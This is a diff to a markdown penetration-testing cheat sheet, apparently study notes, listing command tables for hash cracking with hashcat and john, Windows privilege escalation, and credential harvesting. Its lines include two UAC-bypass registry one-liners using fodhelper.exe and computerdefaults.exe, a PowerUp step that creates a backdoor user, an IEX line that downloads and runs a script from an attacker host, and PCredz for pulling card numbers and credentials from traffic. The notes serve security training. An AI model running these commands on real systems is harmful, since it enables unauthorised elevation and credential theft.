@@ -2669,7 +2669,8 @@ john --wordlist=<PASSWORDS_LIST> hash.txt
 | `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`                   | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.                                            |
 | `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`                                          | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.                                      |
 | `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`                         | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
-| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                                            | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.                                              |
+| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                                            | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.       
+| `hashcat -a 0 -m 0 HASH /usr/share/wordlists/WORDLIST -r /usr/share/hashcat/rules/best64.rule`|              | Uses Hashcat in conjunction with best64.rule, which contains 64 standard password modifications—such as appending numbers or substituting characters with their "leet" equivalents. To perform this kind of attack, we would append the -r <ruleset>                                       |
 | `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.        |
 | `ssh2john.pl SSH.private > ssh.hash`                                                                         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.      |
 | `john ssh.hash --show`                                                                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.                                       |
@@ -3389,6 +3390,8 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 | `Import-Module .\PowerUp.ps1 & Write-UserAddMSI` | Import [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and create malicious msi to create backdoor user |
 | `runas /user:backdoor cmd` | Run as created user, in this case backdoor |
 | [Bypass UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)| Github repo full of useful tricks and tips to bypass UAC |
+| `reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe`| Bypass UAC using computerdefaults |
+| `reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe`| Bypass UAC using optional features or fodhelper.exe |
 | `dir "C:\Program Files"`| Basic info on installed files present within Program Files |
 
 
@@ -3495,6 +3498,8 @@ $lnk.Save()
 | `sudo python2.7 windows-exploit-suggester.py --update` | Update Windows Exploit Suggester database |
 | `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` | Running Windows Exploit Suggester |
 | `IEX (iwr 'http://10.10.10.205/procmon.ps1') `| Run Monitor Script hosted on attacker machine using Invoke-Expression and Invoke-WebRequest.  |
+| ` podman build -f dockerfile -t Pcredz . ` | Build image within PCredz folder using podman|
+| `docker run --net=host -v $(pwd):/opt/Pcredz -it Pcredz ` |map the current working directory inside the Pcredz container and run container.  Ensure PCAP file is within location this is ran from EG run command from `/home/kali/Binaries/Pcredz/demo.pcapng` | 
 
 ### Useful tools 
 
@@ -3510,6 +3515,7 @@ $lnk.Save()
 | [LaZagne](https://github.com/AlessandroZ/LaZagne) | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |
 | [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |
 | [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |
+| [PCredz](https://github.com/lgandx/PCredz) | Tool used to tool extract Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface |
 
 
 
